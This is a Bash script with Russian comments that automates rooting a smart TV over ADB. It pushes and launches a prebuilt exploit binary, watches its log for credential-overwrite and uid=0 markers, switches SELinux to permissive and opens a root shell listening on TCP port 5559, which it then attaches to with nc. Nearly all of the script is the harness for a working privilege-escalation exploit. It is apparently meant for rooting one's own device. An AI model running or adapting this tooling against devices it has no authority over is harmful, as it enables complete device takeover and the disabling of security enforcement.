#!/bin/bash
# ============================================================================
#  TUVIO TV ROOT — авто-раннер
#  Запуск:   ./tvroot.sh           — полный цикл (root + permissive + tcp-shell)
#            ./tvroot.sh se0       — только SELinux permissive (быстро)
#            ./tvroot.sh log       — прицепиться к живому логу
#            ./tvroot.sh shell     — подключиться к root-shell (порт 5559)
#  Опции:    TV=192.168.1.xxx  — адрес телика (env или подправь ниже)
# ============================================================================
TV="${TV:-192.168.1.117}"
AD(){ adb -s "$TV:5555" "$@"; }
BIN_LOCAL="$(dirname "$(readlink -f "$0")")/ymax_root_armv7"
BIN_TVR="/data/local/tmp/ymax_root"
LOG_TVR="/data/local/tmp/yscan.log"
C_G="\033[1;32m"; C_Y="\033[1;33m"; C_R="\033[1;31m"; C_B="\033[1;36m"; C_0="\033[0m"
say(){ printf "$C_B[*]$C_0 %s\n" "$*"; }
ok(){  printf "$C_G[+]$C_0 %s\n" "$*"; }
warn(){ printf "$C_Y[!]$C_0 %s\n" "$*"; }
die(){ printf "$C_R[✗]$C_0 %s\n" "$*"; exit 1; }

# ---------- 0. bootstrap: ждём, пока телик вообще отвечает ----------
wait_boot(){
  say "adb kill-server + перезапуск демона..."
  adb kill-server >/dev/null 2>&1
  adb start-server >/dev/null 2>&1
  say "жду сеть/adb на $TV..."
  local n=0
  while [ $n -lt 60 ]; do
    adb connect "$TV:5555" >/dev/null 2>&1
    if AD shell true >/dev/null 2>&1; then break; fi
    n=$((n+1)); sleep 5
  done
  [ "$n" -lt 60 ] || die "телек не отвечает по $TV:5555 за 5 минут"
  # полностью ли загрузился
  n=0
  while [ $n -lt 30 ]; do
    bc=$(AD shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
    [ "$bc" = "1" ] && break
    n=$((n+1)); sleep 5
  done
  # мала пауза на устаканивание GPU после бута
  say "бут готов... 15 sec"
  sleep 15
  ok "$(AD shell cat /proc/uptime | awk '{print "uptime=" $1 "s"}')"
}

# ---------- 1. push бинаря (обход Text file busy) ----------
push_bin(){
  [ -f "$BIN_LOCAL" ] || die "нет $BIN_LOCAL — собери (см. README)"
  if ! AD push "$BIN_LOCAL" "$BIN_TVR" >/dev/null 2>&1; then
    warn "ymax_root занят (Text file busy) — пушим как ymax_root_2"
    BIN_TVR="/data/local/tmp/ymax_root_2"
    AD push "$BIN_LOCAL" "$BIN_TVR" >/dev/null || die "push упал"
  fi
  ok "бинар на $BIN_TVR"
}

# ---------- 2. запуск эксплойта ----------
run_exploit(){
  local mode="$1"
  AD shell "killall -9 ymax_root 2>/dev/null; killall -9 ymax_root_2 2>/dev/null; sleep 2"
  AD shell "rm -f $LOG_TVR" >/dev/null 2>&1
  say "запуск $mode ..."
  AD shell "nohup $BIN_TVR $mode > $LOG_TVR 2>&1 &" >/dev/null
}

# ---------- 3. живой лог + вердикты ----------
tail_log(){
  local mode="$1" seen_boot=0 seen_tasks=0 seen_root=0 seen_perm=0 seen_tcp=0
  # рисуем с 0; adb не может tail -f долгий стабильно → своя петля чтения приращений
  local last=0 last_progress=0 tick=0
  while :; do
    local size
    size=$(AD shell "stat -c %s $LOG_TVR" 2>/dev/null | tr -d '\r')
    if [ -z "$size" ]; then
      say "лог пропал (крэш? ребут)"; die "смотри uptime: adb shell cat /proc/uptime"
    fi
    if [ "$size" -gt "$last" ] 2>/dev/null; then
      last_progress=$tick
      AD shell "tail -c +$((last+1)) $LOG_TVR" 2>/dev/null | while IFS= read -r line; do
        case "$line" in
          *"[W] === WSCAN"*|*"[S] пишет"*) printf "$C_B%s$C_0\n" "$line" ;;
          *"TARG:"*) printf "$C_Y%s$C_0\n" "$line" ;;
          *"НАШ cred найден"*) printf "$C_Y%s$C_0\n" "$line" ;;
          *"selinux pre"*|*"selinux RAM"*) printf "$C_B%s$C_0\n" "$line" ;;
          *"PERMISSIVE зафиксирован"*) printf "$C_G%s$C_0    <- ВЖИЛ В DRAM\n" "$line" ;;
          *"5 попыток не закрепили"*) printf "$C_Y%s$C_0\n" "$line" ;;
          *"post-getuid uid=0"*) printf "$C_G%s$C_0    <- ROOT В ПРОЦЕССЕ\n" "$line" ;;
          *"ROOT SHELL"*) printf "$C_G%s$C_0    <- ГОТОВО!\n" "$line" ;;
          *"tcp-шелл слушает"*) printf "$C_G%s$C_0    <- nc $TV 5559\n" "$line" ;;
          *"[x]"*|*FAIL*) printf "$C_R%s$C_0\n" "$line" ;;
          *"[W] task "*|*"selinux retry"*) printf "%s\n" "$line" ;;
          *) printf "%s\n" "$line" ;;
        esac
      done
      last=$size
      case "$(AD shell "tail -3 $LOG_TVR" 2>/dev/null | tr -d '\r')" in
        *"ROOT SHELL"*) echo; ok "=== РОТ В ШКОВКЕ: nc $TV 5559 ==="; exit 0 ;;
        *"PERMISSIVE зафиксирован"*) ok "permissive в ядре; проверь: adb shell getenforce"; exit 0 ;;
        *"n't"*) true ;;
      esac
    fi
    tick=$((tick+1))
    # сердцебиение каждые ~30с и watchdog: 150с без прогресса = процесс завис/умер
    if [ $((tick % 15)) -eq 0 ]; then
      local alive
      alive=$(AD shell "ps -A 2>/dev/null | grep -c ymax_root" 2>/dev/null | tr -d '\r')
      if [ "$alive" = "0" ]; then
        warn "процесс ymax_root исчез (лог не растёт) — вышел"
        die "ретрай: ./tvroot.sh"
      elif [ $((tick - last_progress)) -ge 75 ]; then
        warn "5 минут без новых строк в логе — возможно GPU застрял; перезапуск"
        die "ретрай: ./tvroot.sh"
      else
        say "жив ($alive), лог ${size}Б..."
      fi
    fi
    sleep 2
  done
}

# ---------- точки входа ----------
case "$1" in
  log)   tail_log log ;;
  shell)
    say "nc $TV 5559 (Ctrl-C для выхода)"
    exec nc "$TV" 5559
    ;;
  se0)   wait_boot; push_bin; run_exploit se0;   tail_log se0 ;;
  ""|wscan) wait_boot; push_bin; run_exploit wscan; tail_log wscan ;;
  *) echo "использование: $0 [se0|log|shell]"; exit 1 ;;
esac
